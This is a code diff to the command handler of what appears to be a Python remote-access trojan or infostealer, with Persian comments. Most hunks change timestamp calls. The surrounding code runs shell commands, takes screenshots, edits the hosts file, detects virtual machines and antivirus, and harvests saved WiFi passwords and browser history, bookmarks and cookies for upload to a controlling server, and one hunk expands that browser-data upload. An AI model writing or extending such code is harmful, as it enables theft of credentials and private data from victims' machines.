@@ -119,7 +119,7 @@ class CommandHandler:
                 "status": "error",
                 "message": f"Unknown command type: {command_type}",
                 "command_type": command_type,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             return error_result
 
@@ -134,7 +134,7 @@ class CommandHandler:
                 "status": "error",
                 "message": f"Command execution failed: {str(e)}",
                 "command_type": command_type,
-                "timestamp": datetime.datetime.now().isoformat(),
+                "timestamp": datetime.now().isoformat(),
                 "error_details": str(e)
             }
             return error_result
@@ -157,7 +157,7 @@ class CommandHandler:
                 'memory': psutil.virtual_memory()._asdict(),
                 'disk': psutil.disk_usage('/')._asdict(),
                 'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
-                'timestamp': datetime.datetime.now().isoformat(),
+                'timestamp': datetime.now().isoformat(),
                 'client_id': Config.get_client_id(),
                 'client_version': Config.CLIENT_VERSION
             }
@@ -251,7 +251,7 @@ class CommandHandler:
             return {
                 "status": "error",
                 "message": f"Browse command failed: {str(e)}",
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
     
     @staticmethod
@@ -323,7 +323,7 @@ class CommandHandler:
                 'returncode': result.returncode,
                 'command': sleep_command,
                 'original_command': '/sleep',
-                'timestamp': datetime.datetime.now().isoformat(),
+                'timestamp': datetime.now().isoformat(),
                 'success': result.returncode == 0
             }
 
@@ -374,7 +374,7 @@ class CommandHandler:
             # This is similar to get-info but with different structure
             system_info = CommandHandler.handle_get_info(params)
             system_info['online'] = True
-            system_info['last_seen'] = datetime.datetime.now().isoformat()
+            system_info['last_seen'] = datetime.now().isoformat()
             return system_info
         except Exception as e:
             logging.error(f"Status command failed: {str(e)}")
@@ -413,7 +413,7 @@ class CommandHandler:
             return {
                 'screenshot': base64.b64encode(screenshot_data).decode(),
                 'size': len(screenshot_data),
-                'timestamp': datetime.datetime.now().isoformat(),
+                'timestamp': datetime.now().isoformat(),
                 'resolution': f"{screenshot.width}x{screenshot.height}"
             }
             
@@ -451,7 +451,7 @@ class CommandHandler:
                     "status": "error",
                     "message": error_msg,
                     "command": "unknown",
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
             
             # حذف اسلش از ابتدای دستور اگر وجود دارد
@@ -484,7 +484,7 @@ class CommandHandler:
                             "message": error_msg,
                             "command": command,
                             "requires_admin": True,
-                            "timestamp": datetime.datetime.now().isoformat()
+                            "timestamp": datetime.now().isoformat()
                         }
                 except Exception as e:
                     error_msg = f"Failed to check admin privileges: {str(e)}"
@@ -493,7 +493,7 @@ class CommandHandler:
                         "status": "error", 
                         "message": error_msg,
                         "command": command,
-                        "timestamp": datetime.datetime.now().isoformat()
+                        "timestamp": datetime.now().isoformat()
                     }
             
             # نگاشت دستور به دستور واقعی
@@ -533,7 +533,7 @@ class CommandHandler:
                     'returncode': result.returncode,
                     'command': actual_command,
                     'original_command': command,
-                    'timestamp': datetime.datetime.now().isoformat(),
+                    'timestamp': datetime.now().isoformat(),
                     'success': result.returncode == 0,
                     'status': 'success' if result.returncode == 0 else 'error'
                 }
@@ -550,7 +550,7 @@ class CommandHandler:
                     "status": "error",
                     "message": error_msg,
                     "command": actual_command,
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
             
             except FileNotFoundError:
@@ -560,7 +560,7 @@ class CommandHandler:
                     "status": "error",
                     "message": error_msg, 
                     "command": actual_command,
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
             
             except PermissionError:
@@ -570,7 +570,7 @@ class CommandHandler:
                     "status": "error",
                     "message": error_msg,
                     "command": actual_command,
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
             
             except Exception as e:
@@ -580,7 +580,7 @@ class CommandHandler:
                     "status": "error",
                     "message": error_msg,
                     "command": actual_command,
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
         
         except Exception as e:
@@ -589,7 +589,7 @@ class CommandHandler:
             return {
                 "status": "error",
                 "message": error_msg,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
     
     @staticmethod
@@ -646,7 +646,7 @@ class CommandHandler:
                 wifi_data.append({
                     "ssid": ssid,
                     "password": password if password else "No password found",
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 })
             
             if not wifi_data:
@@ -667,7 +667,7 @@ class CommandHandler:
                     communicator.upload_wifi_passwords({
                         "wifi_profiles": wifi_data,
                         "client_id": Config.get_client_id(),
-                        "timestamp": datetime.datetime.now().isoformat()
+                        "timestamp": datetime.now().isoformat()
                     })
                 except Exception as e:
                     logging.warning(f"Failed to upload WiFi passwords: {str(e)}")
@@ -768,7 +768,7 @@ class CommandHandler:
                 'memory': psutil.virtual_memory()._asdict(),
                 'disk': psutil.disk_usage('/')._asdict(),
                 'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
-                'timestamp': datetime.datetime.now().isoformat()
+                'timestamp': datetime.now().isoformat()
             }
             
             # Add additional system details
@@ -819,7 +819,7 @@ class CommandHandler:
                 return {
                     'processes': processes[:100],  # Limit to top 100
                     'total_count': len(processes),
-                    'timestamp': datetime.datetime.now().isoformat()
+                    'timestamp': datetime.now().isoformat()
                 }
             
             elif action == 'kill':
@@ -866,7 +866,7 @@ class CommandHandler:
                 return {
                     'content': content,
                     'path': hosts_path,
-                    'timestamp': datetime.datetime.now().isoformat()
+                    'timestamp': datetime.now().isoformat()
                 }
             
             elif action == 'add':
@@ -924,7 +924,7 @@ class CommandHandler:
                     'status': 'success',
                     'message': f'URL opened: {url}',
                     'url': url,
-                    'timestamp': datetime.datetime.now().isoformat()
+                    'timestamp': datetime.now().isoformat()
                 }
             else:
                 if Config.DEBUG_MODE:
@@ -984,7 +984,7 @@ class CommandHandler:
                     'status': 'success', 
                     'path': dest_path,
                     'size': len(file_content),
-                    'timestamp': datetime.datetime.now().isoformat()
+                    'timestamp': datetime.now().isoformat()
                 }
             
             else:
@@ -1025,7 +1025,7 @@ class CommandHandler:
                 'stderr': result.stderr,
                 'returncode': result.returncode,
                 'process_name': process_name,
-                'timestamp': datetime.datetime.now().isoformat()
+                'timestamp': datetime.now().isoformat()
             }
             
         except subprocess.TimeoutExpired:
@@ -1058,7 +1058,7 @@ class CommandHandler:
                 "status": "success",
                 "message": "Behavior adjusted",
                 "new_behavior": current_behavior,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
         except Exception as e:
             if Config.DEBUG_MODE:
@@ -1130,7 +1130,7 @@ class CommandHandler:
                 "status": "success",
                 "message": "Browser data collected successfully",
                 "data": browser_data,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             
         except Exception as e:
@@ -1154,7 +1154,7 @@ class CommandHandler:
                 "status": "success",
                 "message": "System data collected successfully",
                 "data": system_data,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             
         except Exception as e:
@@ -1166,46 +1166,39 @@ class CommandHandler:
         """دستور جدید برای جمع‌آوری اطلاعات کامل مرورگر"""
         try:
             logging.info("Handling comprehensive browser data collection command")
-
+    
             if not Config.ENABLE_BROWSER_DATA_COLLECTION:
                 return {
                     "status": "disabled",
                     "message": "Browser data collection disabled in config",
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 }
-
+    
+            # ایجاد نمونه collector و جمع‌آوری داده
             collector = SystemCollector()
-            browser_data = collector.collect_comprehensive_browser_data()
-
+            result = collector.collect_comprehensive_browser_data()
+    
             # ارسال داده‌ها به سرور
             try:
                 collector.communicator.upload_browser_data_comprehensive({
-                    "browser_data": browser_data,
+                    "browser_data": result.get("data", {}),
+                    "detection_summary": result.get("detection_summary", {}),
+                    "collection_stats": result.get("stats", {}),
                     "client_id": Config.get_client_id(),
-                    "timestamp": datetime.datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat()
                 })
+                logging.info("Browser data uploaded to server successfully")
             except Exception as e:
                 logging.warning(f"Failed to upload browser data: {str(e)}")
-
-            return {
-                "status": "success",
-                "message": "Comprehensive browser data collected successfully",
-                "data_summary": {
-                    "chrome_history_count": len(browser_data.get("chrome", {}).get("history", [])),
-                    "chrome_bookmarks_count": len(browser_data.get("chrome", {}).get("bookmarks", [])),
-                    "chrome_cookies_count": len(browser_data.get("chrome", {}).get("cookies", [])),
-                    "firefox_history_count": len(browser_data.get("firefox", {}).get("history", [])),
-                    "edge_history_count": len(browser_data.get("edge", {}).get("history", []))
-                },
-                "timestamp": datetime.datetime.now().isoformat()
-            }
-
+    
+            return result
+    
         except Exception as e:
             logging.error(f"Comprehensive browser data collection failed: {str(e)}")
             return {
                 "status": "error",
                 "message": f"Browser data collection failed: {str(e)}",
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
 
     @staticmethod
@@ -1224,7 +1217,7 @@ class CommandHandler:
                 "status": "success",
                 "message": "VM detection completed",
                 "vm_details": vm_details,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             
         except Exception as e:
@@ -1248,7 +1241,7 @@ class CommandHandler:
                 "status": "success",
                 "message": "Antivirus status retrieved",
                 "antivirus_status": av_status,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             
         except Exception as e:
@@ -1270,7 +1263,7 @@ class CommandHandler:
                 "status": "success",
                 "message": "File download initiated",
                 "result": result,
-                "timestamp": datetime.datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat()
             }
             
         except Exception as e:
@@ -1298,7 +1291,7 @@ class CommandHandler:
                 'stderr': result.stderr,
                 'returncode': result.returncode,
                 'command': command,
-                'timestamp': datetime.datetime.now().isoformat()
+                'timestamp': datetime.now().isoformat()
             }
             
         except subprocess.TimeoutExpired:
